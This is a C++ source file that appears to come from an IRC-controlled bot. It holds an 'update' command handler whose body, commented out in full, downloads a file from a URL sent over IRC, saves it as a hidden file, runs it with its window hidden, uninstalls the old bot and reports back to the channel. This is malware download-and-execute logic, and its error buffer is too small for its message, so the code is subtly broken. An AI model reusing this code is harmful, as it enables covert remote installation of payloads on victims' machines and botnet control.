#include "../IRC.hpp"

int IRC::CMDUpdate( string url ) {
	/*if (url == "")
		IRCSend(IRC_MSG, servers[currserver].channel, MSG_UPDATE_NO_ARGS);
	DWORD r, d, start, total;
	char buffer[512];
	char dlfrom[512];
	char dlto[MAX_PATH];
	//api->thisfile = "C:\\Documents and Settings\\Application Data\\exe.exe";
	api->lstrcpy(dlfrom, (LPTSTR)url.c_str());
	api->lstrcpy(dlto, (LPTSTR)api->thisfile.substr(0, api->thisfile.find_last_of("\\") + 1).c_str());
	api->lstrcat(dlto, (LPTSTR)url.substr(url.find_last_of("/") + 1, url.length() - url.find_last_of("/") + 1).c_str());
	api->DeleteFile(dlto);
	HANDLE io = api->InternetOpenUrl(api->hIneth, dlfrom, NULL, 0, 0, 0);
	if (io != NULL) {
		HANDLE f = api->CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
		if (f == INVALID_HANDLE_VALUE) {
			api->InternetCloseHandle(io);
			return(IRCSend(IRC_MSG, servers[currserver].channel, "[UPDATE]: Failed to create output file."));
		}
		total = 0;
		start = api->GetTickCount();
		char *fileTotBuff = (char *)malloc(512000);
		do {
			ZeroMemory(buffer, sizeof(buffer));
			api->InternetReadFile(io, buffer, sizeof(buffer), &r);
			api->WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				unsigned int bytestocopy;
				bytestocopy = 512000 - total;
				if (bytestocopy > r) 
					bytestocopy = r;
				memcpy(&fileTotBuff[total], buffer, bytestocopy);
			}
			total += r;
		}
		while (r > 0);
		//speed = total / (((api->GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		api->CloseHandle(f);
		api->InternetCloseHandle(io);
		//irc->pmsg(dl.target,"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(dl.bdata1?update_title:download_title), total/1024.0, dlto, speed/1024.0);
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		if (!api->CreateProcess(NULL, dlto, NULL, NULL, FALSE, 0, NULL, api->directory.c_str(), &si, &pi)) {
			return(IRCSend(IRC_MSG, servers[currserver].channel, "[UPDATE]: Download succeeded but process failed to start. Reason Unknown."));
		} else {
			CMDUninstall(true);
			IRCSend(IRC_MSG, servers[currserver].channel, MSG_UPDATE_SUCCESS);
			globstatus = CODE_QUIT;
			api->closesocket(ircsock);
			return CODE_QUIT;
			//return(IRCSend(IRC_MSG, servers[currserver].channel, "[UPDATE]: Download succeeded. Process successfully started."));
		}
	} else {
		char errmsg[64] = "\0";
		api->wsprintfA(errmsg, "[UPDATE]: Error resolving DNS, or perhaps there is something wrong with your URL? ErrCode: %d", api->GetLastError());
		return(IRCSend(IRC_MSG, servers[currserver].channel, errmsg));
	}*/
	return 0;
}